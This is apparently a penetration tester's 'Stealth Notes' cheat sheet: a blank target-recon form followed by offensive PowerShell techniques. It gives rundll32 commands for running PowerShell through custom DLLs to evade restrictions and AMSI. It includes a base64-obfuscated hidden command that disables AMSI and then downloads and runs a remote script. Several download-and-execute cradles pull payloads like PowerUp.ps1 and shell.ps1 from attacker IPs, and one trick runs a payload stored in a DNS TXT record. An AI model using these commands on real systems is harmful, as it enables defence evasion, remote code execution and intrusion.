# Stealth Notes

## Data 

IP: 
OS:
Arch:
Hostname:
DNS:
Domain:  / Domain SID:
Machine Purpose: 
Services:
Service Languages:
Users:
Email and Username Formatting:
Credentials:



#### Mindmap-per Ideas




- PowerShell Stager - no shell 

- Bypass using COM: [xpn/COM_to_registry.ps1](https://gist.githubusercontent.com/xpn/1e9e879fab3e9ebfd236f5e4fdcfb7f1/raw/ceb39a9d5b0402f98e8d3d9723b0bd19a84ac23e/COM_to_registry.ps1)
    
- Bypass using your own Powershell DLL: [p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll) & [iomoath/PowerShx](https://github.com/iomoath/PowerShx)
```powershell 
rundll32 PowerShx.dll,main <script>
rundll32 PowerShx.dll,main -h # Display this message
rundll32 PowerShx.dll,main -f <path> # Run the script passed as argument
rundll32 PowerShx.dll,main -w # Start an interactive console in a new window (Default)
rundll32 PowerShdll,main -i # Start an interactive console in this console

rundll32 PowerShx.dll,main -e <PS script to run>
rundll32 PowerShx.dll,main -f <path> # Run the script passed as argument
rundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet> # Load a script and run a PS cmdlet
rundll32 PowerShx.dll,main -w # Start an interactive console in a new window
rundll32 PowerShx.dll,main -i # Start an interactive console
rundll32 PowerShx.dll,main -s # Attempt to bypass AMSI
rundll32 PowerShx.dll,main -v # Print Execution Output to the console
```

```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=" 
```

```powershell
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this: 
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
